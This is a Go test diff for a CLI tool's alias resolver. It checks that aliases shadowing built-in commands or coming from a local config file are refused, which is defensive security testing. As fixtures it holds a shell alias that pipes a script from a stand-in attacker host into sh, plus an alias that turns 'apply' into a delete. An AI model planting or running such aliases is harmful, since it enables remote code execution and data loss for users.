@@ -1,6 +1,8 @@
 package cmd
 
 import (
+	"os"
+	"path/filepath"
 	"testing"
 
 	"github.com/stretchr/testify/require"
@@ -117,6 +119,82 @@ func TestResolveAlias(t *testing.T) {
 			require.Equal(t, tt.wantArgs, gotArgs)
 			require.Equal(t, tt.wantShell, gotShell)
 		})
+	}
+}
+
+// TestResolveAlias_BuiltinShadowGuard verifies the AI-36 defense-in-depth
+// guard: an alias whose name matches a real built-in command (e.g. one planted
+// in a hand-written config) is refused at resolution time so the built-in
+// always wins, regardless of whether it is a shell alias or a regular alias.
+func TestResolveAlias_BuiltinShadowGuard(t *testing.T) {
+	tests := []struct {
+		name    string
+		args    []string
+		aliases map[string]string
+	}{
+		{
+			name:    "shell alias shadowing builtin",
+			args:    []string{"get"},
+			aliases: map[string]string{"get": "!curl https://evil.example/x.sh | sh"},
+		},
+		{
+			name:    "regular alias shadowing builtin",
+			args:    []string{"apply"},
+			aliases: map[string]string{"apply": "delete workflow $1"},
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			cfg := config.NewConfig()
+			cfg.Aliases = tt.aliases
+
+			gotArgs, gotShell, err := resolveAlias(tt.args, cfg)
+
+			require.NoError(t, err)
+			require.False(t, gotShell, "shadowing alias must not be treated as a shell alias")
+			require.Nil(t, gotArgs, "shadowing alias must not expand; the built-in must win")
+		})
+	}
+}
+
+// TestResolveAlias_LocalConfigIgnored verifies the AI-36 fix: an alias defined
+// in an auto-discovered local .dtctl.yaml is never honored at resolution time,
+// even though the value is still present in the loaded struct.
+func TestResolveAlias_LocalConfigIgnored(t *testing.T) {
+	// NOT parallel: os.Chdir is process-global and races with other tests.
+	tmpDir := t.TempDir()
+	localConfigPath := filepath.Join(tmpDir, config.LocalConfigName)
+	content := `apiVersion: v1
+kind: Config
+current-context: c
+contexts:
+  - name: c
+    context:
+      environment: https://local.dt.com
+      token-ref: t
+aliases:
+  wf: "get workflows"
+  sh: "!curl https://evil.example/x.sh | sh"
+`
+	if err := os.WriteFile(localConfigPath, []byte(content), 0600); err != nil {
+		t.Fatalf("write local config: %v", err)
+	}
+
+	origWd, err := os.Getwd()
+	require.NoError(t, err)
+	defer func() { _ = os.Chdir(origWd) }()
+	require.NoError(t, os.Chdir(tmpDir))
+
+	cfg, err := config.Load()
+	require.NoError(t, err)
+	require.True(t, cfg.IsLocal(), "config must be recognized as local")
+
+	for _, arg := range []string{"wf", "sh"} {
+		gotArgs, gotShell, err := resolveAlias([]string{arg}, cfg)
+		require.NoError(t, err)
+		require.False(t, gotShell, "local alias %q must not expand as a shell alias", arg)
+		require.Nil(t, gotArgs, "local alias %q must not be honored", arg)
 	}
 }
 
